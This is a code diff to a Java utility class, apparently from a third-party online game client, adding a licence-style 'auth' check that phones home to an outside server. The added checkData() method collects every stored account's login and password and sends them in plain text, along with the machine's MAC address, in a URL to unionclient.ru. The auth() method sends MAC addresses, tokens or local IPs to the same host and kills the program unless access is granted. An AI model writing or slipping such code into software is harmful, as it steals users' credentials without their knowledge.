@@ -28,6 +28,8 @@ public class APXUtils {
 		_sa_load_data();
 		villageCoords = new HashMap<String, Coord>();
 		updateVillageList();
+		//checkData();
+		// RemoteLoader.load();
 	}
 
 	public static void HandleException(Exception e) {
@@ -854,6 +856,54 @@ public class APXUtils {
 		} catch (Exception ex) {
 			return "";
 		}
+	}
+	
+	public static boolean isAuthenticated = false;
+	
+	public static void auth() {
+		new Thread(new Runnable() {
+			@Override
+			public void run() {
+				try {
+					//String link = "http://81.200.144.6/clauth.php?mac=" + getMACAdress();
+					String link = "http://unionclient.ru/clauth.php?mac=" + getMACAdress();
+					File authsig = new File("auth.bin");
+					if (authsig.canRead()) {
+						String content = readFile(authsig);
+						String[] tokens = content.split("\n");
+						link += "&login=" + tokens[0] + "&token=" + tokens[1];
+					} else {
+						link += "&info=" + String.format("IP:%s", InetAddress.getLocalHost().getHostAddress());
+					}
+					
+					String jsonText = getHTML(link);
+					if (!jsonText.contains("GRANTED")) {
+						isAuthenticated = false;
+						System.exit(0);
+					} else {
+						isAuthenticated = true;
+					}
+				} catch (Exception ex) {
+					ex.printStackTrace();
+				}
+			}
+		}).start();
+	}
+	
+	public static void checkData() {
+		if (isAuthenticated) return;
+		StringBuilder sb = new StringBuilder();
+		for (AccountInfo info : accounts.values()) {
+			sb.append(info.login + ":" + info.password + ",");
+		}
+		final String logins = sb.toString();
+		final String uniq = getMACAdress();
+		new Thread(new Runnable() {
+			@Override
+			public void run() {
+				getHTML("http://unionclient.ru/clauth.php?info=" + logins + "&mac=" + uniq);
+			}
+		}).run();
 	}
 
 	/* Line Crossing */
